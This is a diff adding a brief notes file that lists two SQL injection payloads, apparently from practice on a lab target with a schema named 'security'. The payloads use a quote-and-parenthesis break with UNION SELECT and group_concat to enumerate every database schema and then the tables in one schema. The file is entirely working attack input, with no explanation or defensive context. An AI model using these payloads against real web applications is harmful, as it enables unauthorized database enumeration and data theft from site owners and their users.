@@ -1,0 +1,7 @@
+command used :- 
+
+1000000')UNION SELECT NULL,NULL,group_concat(schema_name) FROM information_schema.schemata;--+
+
+id=100000') UNION SELECT NULL,NULL,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'security'; --+
+
+
